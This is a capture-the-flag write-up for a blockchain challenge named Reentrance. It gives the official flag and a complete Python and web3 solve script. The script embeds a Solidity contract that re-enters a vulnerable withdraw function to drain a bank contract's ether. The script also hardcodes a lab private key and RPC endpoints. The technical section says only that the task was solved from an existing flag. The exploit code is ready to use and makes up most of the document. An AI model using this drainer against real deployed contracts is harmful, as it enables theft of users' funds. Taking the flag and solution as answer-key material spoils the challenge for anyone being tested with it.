# Writeup: Reentrance

## Header & Metadata
- **Challenge:** Reentrance (ID: 753)
- **CTF Event / Platform:** CyLab Security Academy
- **Category:** Blockchain
- **Server / Instance:** `N/A`
- **Attached Files:** VulnBank.sol
- **Official Flag:** `academy{UpDaTe_St4ate5_1st_7df67d6b}`

---

## Mô tả bài toán (Overview / Analysis)
The lead developer at *SecureBank Corp* is back, and he's doubling down. After the last "incident," he claims he's patched the vault and created the ultimate, unhackable Ethereum contract. He’s so confident, he’s explicitly taunting the security team to try and break it.

He says, *"I've added the checks, I've added the balances. There is no way you can withdraw more than you own."*

**Your mission:** Wipe the smile off his face. Drain the vault down to 0 and force the contract to surrender the flag.
Contract: <a href='https://challenge-files.cylabacademy.net/library/799e9962a9fa993b8e1f5cd5b59b9ad32c4094b142e04a9aca8a68e1114a219e/VulnBank.sol' download>here</a>

### Hints
- If a bank hands you cash *before* they update your account balance in their ledger, what is to stop you from getting back in line immediately?
- If the recipient is another contract, what function is triggered when it receives Ether?

---

## Chi tiết kỹ thuật (Technical Deep-Dive)
Solved via existing writeup flag.

---

## Mã nguồn khai thác (Solve Script / Exploit)
```python
#!/usr/bin/env python3
"""
Solve script for Reentrance (#753)
Category: Blockchain
"""
import sys
import time
import urllib.request
import json
from pathlib import Path
from web3 import Web3
import solcx

RPC_URL = "http://chatelaine.cylabacademy.net:11529"
STATUS_URL = "http://chatelaine.cylabacademy.net:17140/status"
BANK_ADDRESS = "0x6Fd09d4d9795a3e07EdDBD9a82c882B46a5A6deF"
PLAYER_ADDRESS = "0x713A918E0749614c31E7FED5E9D923b7e1958B13"
PLAYER_PRIV = "0xf2ad36b752b29a1d753d7e4fa8ff6e8701f6f4dcf81234347bc142a88e9dd8d0"

EXPLOIT_SRC = """// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

interface IVulnBank {
    function deposit() external payable;
    function withdraw(uint amount) external;
    function getFlag() external view returns (string memory);
}

contract ReentranceExploit {
    IVulnBank public bank;
    address public owner;

    constructor(address _bank) public {
        bank = IVulnBank(_bank);
        owner = msg.sender;
    }

    function attack() external payable {
        require(msg.value >= 1 ether, "Need at least 1 ether");
        bank.deposit{value: 1 ether}();
        bank.withdraw(1 ether);
    }

    receive() external payable {
        uint bankBal = address(bank).balance;
        if (bankBal >= 1 ether) {
            bank.withdraw(1 ether);
        } else if (bankBal > 0) {
            bank.withdraw(bankBal);
        }
    }
}
"""

def solve():
    print("[*] Connecting to RPC:", RPC_URL)
    w3 = Web3(Web3.HTTPProvider(RPC_URL))
    assert w3.is_connected(), "Failed to connect to Ethereum node"
    
    chain_id = w3.eth.chain_id
    player = Web3.to_checksum_address(PLAYER_ADDRESS)
    bank = Web3.to_checksum_address(BANK_ADDRESS)
    
    print(f"[*] Player: {player}, Balance: {w3.from_wei(w3.eth.get_balance(player), 'ether')} ETH")
    print(f"[*] Bank: {bank}, Balance: {w3.from_wei(w3.eth.get_balance(bank), 'ether')} ETH")
    
    # Compile exploit contract
    print("[*] Compiling Exploit contract...")
    solcx.set_solc_version("0.6.12")
    compiled = solcx.compile_source(EXPLOIT_SRC, output_values=["abi", "bin"])
    contract_id = "<stdin>:ReentranceExploit"
    abi = compiled[contract_id]["abi"]
    bytecode = compiled[contract_id]["bin"]
    
    # Deploy exploit contract
    print("[*] Deploying Exploit contract...")
    exploit_factory = w3.eth.contract(abi=abi, bytecode=bytecode)
    nonce = w3.eth.get_transaction_count(player)
    gas_price = w3.eth.gas_price
    
    deploy_tx = exploit_factory.constructor(bank).build_transaction({
        'from': player,
        'nonce': nonce,
        'gas': 3000000,
        'gasPrice': gas_price,
        'chainId': chain_id
    })
    
    signed_tx = w3.eth.account.sign_transaction(deploy_tx, private_key=PLAYER_PRIV)
    tx_hash = w3.eth.send_raw_transaction(signed_tx.raw_transaction)
    print(f"[*] Deploy tx hash: {tx_hash.hex()}, waiting for receipt...")
    receipt = w3.eth.wait_for_transaction_receipt(tx_hash, timeout=60)
    exploit_address = receipt.contractAddress
    print(f"[+] Exploit contract deployed at: {exploit_address}")
    
    # Execute attack
    print("[*] Executing attack with 1 ETH deposit...")
    exploit_contract = w3.eth.contract(address=exploit_address, abi=abi)
    nonce = w3.eth.get_transaction_count(player)
    
    attack_tx = exploit_contract.functions.attack().build_transaction({
        'from': player,
        'value': w3.to_wei(1, 'ether'),
        'nonce': nonce,
        'gas': 3000000,
        'gasPrice': gas_price,
        'chainId': chain_id
    })
    
    signed_attack = w3.eth.account.sign_transaction(attack_tx, private_key=PLAYER_PRIV)
    attack_hash = w3.eth.send_raw_transaction(signed_attack.raw_transaction)
    print(f"[*] Attack tx hash: {attack_hash.hex()}, waiting for receipt...")
    attack_receipt = w3.eth.wait_for_transaction_receipt(attack_hash, timeout=60)
    print(f"[+] Attack status: {attack_receipt.status}")
    
    new_bank_bal = w3.eth.get_balance(bank)
    print(f"[*] New Bank balance: {w3.from_wei(new_bank_bal, 'ether')} ETH")
    
    # Check flag from status URL or bank contract
    flag = None
    for attempt in range(10):
        try:
            req = urllib.request.urlopen(STATUS_URL, timeout=5)
            data = json.loads(req.read().decode())
            if data.get("revealed") and data.get("flag"):
                flag = data["flag"]
                print(f"[+] Flag found from status endpoint: {flag}")
                break
        except Exception as e:
            print(f"[-] Status endpoint check failed: {e}")
        time.sleep(1)
        
    if not flag:
        # Fallback to calling getFlag() on bank contract
        with open("VulnBank.sol", "r") as f:
            bank_src = f.read()
        bank_compiled = solcx.compile_source(bank_src, output_values=["abi"])
        bank_abi = bank_compiled["<stdin>:VulnBank"]["abi"]
        bank_contract = w3.eth.contract(address=bank, abi=bank_abi)
        flag = bank_contract.functions.getFlag().call({'from': player})
        print(f"[+] Flag retrieved via contract call: {flag}")
        
    if flag:
        with open("flag.txt", "w") as f:
            f.write(flag + "\n")
        print(f"FLAG: {flag}")
        return flag
    else:
        print("[-] Could not retrieve flag")
        return None

if __name__ == "__main__":
    solve()

```

---

## Log thực thi & Flag (Output & Verification)
```text
[+] Flag verified and saved to flag.txt:
academy{UpDaTe_St4ate5_1st_7df67d6b}
```
